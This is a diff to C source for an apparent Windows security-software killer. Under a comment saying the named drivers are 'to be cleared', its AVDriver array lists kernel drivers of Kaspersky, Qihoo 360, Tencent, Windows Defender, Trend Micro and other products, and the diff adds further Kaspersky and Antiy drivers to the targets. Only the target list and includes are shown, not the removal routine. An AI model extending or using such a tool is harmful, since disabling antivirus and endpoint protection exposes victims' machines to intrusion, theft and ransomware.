@@ -2,6 +2,7 @@
 #include<stdio.h>
 #include<winternl.h>
 #include<psapi.h>
+#include <time.h>
 #pragma comment(lib,"ntdll.lib")
 
 /*
@@ -17,7 +18,7 @@ CHAR* DrivePath = NULL;
 
 //Set the driver name to be cleared
 CONST CHAR* AVDriver[] = {
-	"klflt.sys","klhk.sys","klif.sys","klupd_KES-21-9_arkmon.sys","KLIF.KES-21-9.sys","klbackupflt.KES-21-9.sys",
+	"klflt.sys","klhk.sys","klif.sys","klupd_KES-21-9_arkmon.sys","KLIF.KES-21-9.sys","klbackupflt.KES-21-9.sys","klids.sys","klupd_klif_arkmon.sys",
 	"QaxNfDrv.sys","QKBaseChain64.sys","QKNetFilter.sys","QKSecureIO.sys","QesEngEx.sys","QkHelp64.sys","qmnetmonw64.sys",
 	"QMUdisk64_ev.sys","QQSysMonX64_EV.sys","TAOKernelEx64_ev.sys","TFsFltX64_ev.sys","TAOAcceleratorEx64_ev.sys","QQSysMonX64.sys","TFsFlt.sys",
 	"sysdiag_win10.sys","sysdiag.sys",
@@ -25,6 +26,7 @@ CONST CHAR* AVDriver[] = {
 	"360qpesv64.sys","360AntiSteal64.sys","360AntiSteal.sys","360qpesv.sys","360FsFlt.sys","360Box64.sys","360netmon.sys","360AntiHacker64.sys","360Hvm64.sys","360qpesv64.sys","360AntiHijack64.sys","360AntiExploit64.sys","DsArk64.sys","360Sensor64.sys","DsArk.sys", 
 	"WdFilter.sys","MpKslDrv.sys","mpsdrv.sys","WdNisDrv.sys","win32k.sys",
 	"TmPreFilter.sys","TmXPFlt.sys",
+	"AHipsFilter.sys","AHipsFilter64.sys","GuardKrnl.sys","GuardKrnl64.sys","GuardKrnlXP64.sys","protectdrv.sys","protectdrv64.sys","AntiyUSB.sys","AntiyUSB64.sys","AHipsXP.sys","AHipsXP64.sys","AtAuxiliary.sys","AtAuxiliary64.sys","TrustSrv.sys","TrustSrv64.sys",
 	NULL
 };
 
